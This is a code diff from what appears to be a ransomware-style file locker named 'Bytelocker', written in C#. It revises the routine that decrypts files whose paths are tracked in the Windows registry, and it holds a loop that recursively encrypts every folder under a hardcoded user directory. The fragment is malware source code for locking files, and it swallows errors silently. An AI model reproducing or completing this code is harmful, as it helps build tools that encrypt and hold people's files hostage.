@@ -12,7 +12,6 @@ namespace Bytelocker.CryptoManager
         {
             this.rm = new RegistryManager();
             this.rm.CreateMainKey();
-            this.rm.CreateSubKey(RegistryManager.FOLDER_KEY_NAME);
         }
 
         public void DecryptSingleFile(String file)
@@ -25,15 +24,25 @@ namespace Bytelocker.CryptoManager
 
         public void DecryptAll()
         {
-            RegistryManager rm = new RegistryManager();
-            DirManager dfm = new DirManager();
+            FileManager fm = new FileManager();
 
-            List<String> dirs = rm.ReadAllValues(RegistryManager.FOLDER_KEY_NAME);
-
-            foreach (String subDir in dirs)
+            try
             {
-                dfm.ChooseDir(subDir);
-                dfm.DecryptDir();
+                List<String> files = rm.ReadAllValues(RegistryManager.FILES_KEY_NAME);
+
+                foreach (String file_path in files)
+                {
+                    fm.ChooseFile(file_path);
+                    fm.SetupFileEncrypter();
+                    if (fm.DecryptFile())
+                    {
+                        fm.DeleteFile();
+                        fm.RenameTmpFileToOrig();
+                    }
+                }
+            }
+            catch (Exception)
+            {
             }
         }
         /*
@@ -58,10 +67,10 @@ namespace Bytelocker.CryptoManager
             DirManager dfm = new DirManager();
             List<String> dirs = DirManager.GetFoldersRecursive(@"C:\Users\nic\Desktop\New folder");
             foreach (String subDir in dirs)
-                {
+            {
                 dfm.ChooseDir(subDir);
                 dfm.EncryptDir();
-                }
+            }
         }
 
         public List<String> FilesEncryptedList()
